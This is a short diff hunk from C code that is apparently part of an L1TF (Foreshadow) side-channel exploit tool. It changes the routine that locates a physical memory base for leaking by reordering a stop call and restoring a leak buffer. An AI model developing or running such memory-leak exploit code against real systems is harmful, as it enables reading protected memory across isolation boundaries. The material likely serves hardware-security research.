@@ -966,13 +966,14 @@ uintptr_t l1tf_find_base(void)
         if (verbose >= 1) printf("l1tf_find_base: run %3d  | pa %12lx  |  hits %4d\n", run, pa+off, hits);
       }
       if (off >= 16) {
+        spectre_touch_base_stop();
+        l1tf_leak_buffer_modify(&leak_addr, leak_addr.original_pfn << 12);
         if (verbose >= 1) {
           double time = (clock_read()-t_start)/1000000000.0;
           uintptr_t len = (pa-start) + run*(end-start);
           printf("l1tf_find_base: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
           l1tf_test_base(pa, 100000);
         }
-        spectre_touch_base_stop();
         return pa;
       }
     }
